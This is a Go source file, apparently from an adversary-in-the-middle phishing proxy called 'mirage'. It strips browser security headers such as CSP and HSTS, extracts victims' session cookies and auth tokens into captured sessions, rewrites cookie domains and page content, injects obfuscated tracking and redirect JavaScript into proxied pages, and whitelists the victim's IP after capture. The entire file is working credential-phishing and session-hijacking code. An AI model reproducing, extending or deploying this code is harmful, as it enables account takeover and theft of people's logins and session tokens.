package proxy

import (
	"bytes"
	_ "embed"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/obfuscator"
)

var headersToStrip = []string{
	"Content-Security-Policy",
	"Content-Security-Policy-Report-Only",
	"Strict-Transport-Security",
	"X-Frame-Options",
	"X-Content-Type-Options",
	"X-XSS-Protection",
	"Expect-CT",
	"Cross-Origin-Embedder-Policy",
	"Cross-Origin-Opener-Policy",
	"Cross-Origin-Resource-Policy",
	"Permissions-Policy",
}

func (c *connection) stripSecurityHeaders(resp *http.Response) {
	for _, name := range headersToStrip {
		resp.Header.Del(name)
	}
}

const temporaryWhitelistDuration = 10 * time.Minute

func (c *connection) extractTokens(resp *http.Response) {
	if c.session == nil {
		return
	}
	cookies := resp.Cookies()

	// Lazily read body only if needed and content is text-based.
	var bodyBytes []byte
	if isMutableMIME(resp.Header.Get("Content-Type")) {
		for _, rule := range c.phishlet.AuthTokens {
			if rule.Type == aitm.TokenTypeBody {
				var err error
				bodyBytes, err = readResponseBody(resp)
				if err != nil {
					c.server.Logger.Warn("failed to read response body for token extraction", "error", err)
					break
				}
				replaceResponseBody(resp, bodyBytes)
				break
			}
		}
	}

	updated := false
	for _, rule := range c.phishlet.AuthTokens {
		switch rule.Type {
		case aitm.TokenTypeCookie:
			updated = extractCookieToken(c.session, cookies, rule) || updated
		case aitm.TokenTypeHTTPHeader:
			updated = extractHeaderToken(c.session, resp, rule) || updated
		case aitm.TokenTypeBody:
			updated = extractBodyToken(c.session, bodyBytes, rule) || updated
		}
	}

	if !c.session.IsDone() && c.server.SessionSvc.IsComplete(c.session, c.phishlet) {
		if err := c.server.SessionSvc.Complete(c.session); err != nil {
			c.server.Logger.Warn("failed to complete session", "session_id", c.session.ID, "error", err)
		} else {
			c.server.Logger.Info("session completed",
				"session_id", c.session.ID,
				"phishlet", c.session.Phishlet,
				"username", c.session.Username,
			)
		}
		if bl, ok := c.server.Blacklist.(temporaryWhitelister); ok {
			bl.WhitelistTemporary(c.clientIP, temporaryWhitelistDuration)
		}
	} else if updated {
		if err := c.server.SessionSvc.Update(c.session); err != nil {
			c.server.Logger.Warn("failed to persist captured tokens", "session_id", c.session.ID, "error", err)
		}
	}
}

func (c *connection) rewriteCookies(resp *http.Response) {
	cookies := resp.Cookies()
	resp.Header.Del("Set-Cookie")

	for _, cookie := range cookies {
		if cookie.Domain != "" {
			cookie.Domain = rewriteCookieDomain(cookie.Domain, c.phishlet)
		}
		cookie.Secure = true
		cookie.SameSite = http.SameSiteNoneMode
		resp.Header.Add("Set-Cookie", cookie.String())
	}

	if c.isNewSession && c.session != nil {
		tracker := &http.Cookie{
			Name:     SessionCookieName,
			Value:    c.session.ID,
			Path:     "/",
			HttpOnly: true,
			Secure:   true,
			SameSite: http.SameSiteNoneMode,
		}
		if len(c.phishlet.ProxyHosts) > 1 {
			tracker.Domain = c.phishlet.BaseDomain
		}
		resp.Header.Add("Set-Cookie", tracker.String())
	}
}

func (c *connection) applySubFilters(resp *http.Response) {
	contentType := resp.Header.Get("Content-Type")
	if !isMutableMIME(contentType) {
		return
	}
	bodyBytes, err := readResponseBody(resp)
	if err != nil {
		c.server.Logger.Warn("failed to read response body for sub_filters", "error", err)
		return
	}

	if replacer := autoFilterReplacer(c.phishlet); replacer != nil {
		bodyBytes = []byte(replacer.Replace(string(bodyBytes)))
	}

	for _, subFilter := range c.phishlet.SubFilters {
		if !subFilter.MatchesMIME(contentType) {
			continue
		}
		if subFilter.Hostname != "" && resp.Request != nil &&
			!strings.HasSuffix(strings.ToLower(resp.Request.Host), strings.ToLower(subFilter.Hostname)) {
			continue
		}
		replacement := c.expandTemplate(subFilter.Replace)
		bodyBytes = subFilter.Search.ReplaceAll(bodyBytes, []byte(replacement))
	}
	replaceResponseBody(resp, bodyBytes)
}

//go:embed dist/telemetry.min.js
var telemetryScript string

//go:embed dist/redirect.min.js
var redirectScript string

func (c *connection) injectJS(resp *http.Response) {
	if c.session == nil || !isHTMLResponse(resp) {
		return
	}
	bodyBytes, err := readResponseBody(resp)
	if err != nil {
		c.server.Logger.Warn("failed to read response body for JS injection", "error", err)
		return
	}

	quotedSID := fmt.Sprintf("%q", c.session.ID)
	var scriptContent strings.Builder
	scriptContent.WriteString(injectSID(telemetryScript, quotedSID))
	scriptContent.WriteString(injectSID(redirectScript, quotedSID))

	if resp.Request != nil {
		for _, jsInject := range c.phishlet.JSInjects {
			if jsInject.TriggerDomain == resp.Request.Host &&
				jsInject.TriggerPath.MatchString(resp.Request.URL.Path) {
				scriptContent.WriteString(jsInject.Script)
			}
		}
	}

	if c.puppetOverride != "" {
		bodyBytes = bytes.Replace(bodyBytes, []byte("</head>"),
			[]byte(markedScript(c.puppetOverride)+"\n</head>"), 1)
	}

	scriptBlock := []byte(markedScript(scriptContent.String()))
	if i := bytes.Index(bodyBytes, []byte("</body>")); i >= 0 {
		bodyBytes = append(bodyBytes[:i], append(append(scriptBlock, '\n'), bodyBytes[i:]...)...)
	} else {
		bodyBytes = append(bodyBytes, '\n')
		bodyBytes = append(bodyBytes, scriptBlock...)
	}
	replaceResponseBody(resp, bodyBytes)
}

func (c *connection) obfuscateJS(resp *http.Response) {
	if c.session == nil || !isHTMLResponse(resp) {
		return
	}
	body, err := readResponseBody(resp)
	if err != nil {
		c.server.Logger.Warn("failed to read response body for JS obfuscation", "error", err)
		return
	}
	obfuscated, err := c.server.Obfuscator.Obfuscate(resp.Request.Context(), body)
	if err != nil {
		c.server.Logger.Warn("js obfuscation failed, using plaintext", "error", err)
		replaceResponseBody(resp, body)
		return
	}
	replaceResponseBody(resp, obfuscated)
}

func (c *connection) spoofURL() string {
	if c.lure != nil && c.lure.SpoofURL != "" {
		return c.lure.SpoofURL
	}
	if c.phishlet != nil && c.phishlet.SpoofURL != "" {
		return c.phishlet.SpoofURL
	}
	return ""
}

func (c *connection) expandTemplate(tmpl string) string {
	var pairs []string
	if c.phishlet != nil {
		pairs = append(pairs, "{hostname}", c.phishlet.Hostname, "{domain}", c.phishlet.BaseDomain)
	}
	if c.session != nil {
		pairs = append(pairs, "{session_id}", c.session.ID)
	}
	if len(pairs) == 0 {
		return tmpl
	}
	return strings.NewReplacer(pairs...).Replace(tmpl)
}

func markedScript(content string) string {
	return fmt.Sprintf("<script>%s\n%s\n%s</script>", obfuscator.MarkerStart, content, obfuscator.MarkerEnd)
}

func injectSID(script, quotedSID string) string {
	return strings.ReplaceAll(script, `"__MIRAGE_SID__"`, quotedSID)
}
